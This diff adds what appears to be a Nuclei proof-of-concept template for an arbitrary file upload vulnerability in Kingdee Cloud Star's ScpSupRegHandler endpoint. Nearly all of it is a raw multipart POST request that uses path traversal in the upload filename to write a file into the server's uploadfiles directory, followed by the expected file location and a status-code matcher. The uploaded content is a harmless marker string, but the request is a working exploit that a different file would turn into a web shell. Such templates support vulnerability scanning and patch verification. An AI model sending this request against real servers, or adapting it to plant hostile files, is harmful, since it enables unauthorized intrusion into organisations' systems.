@@ -1,0 +1,78 @@
+id: poc-te5f4x61r14k7r96
+info:
+  name: 金蝶OA 云星空 ScpSupRegHandler 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/te5f4x61r14k7r96'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: te5f4x61r14k7r96
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061
+
+
+
+
+    --2ac719f8e29343df94aa4ab49e456061
+
+
+    Content-Disposition: form-data; name="dbId_v"
+
+
+
+
+    .
+
+
+    --2ac719f8e29343df94aa4ab49e456061
+
+
+    Content-Disposition: form-data; name="FID"
+
+
+
+
+    2022
+
+
+    --2ac719f8e29343df94aa4ab49e456061
+
+
+    Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/dudesuite.txt"
+
+
+    Content-Type: text/plain
+
+
+
+
+    dudesuite
+
+
+    --2ac719f8e29343df94aa4ab49e456061--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /k3cloud/uploadfiles/dudesuite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
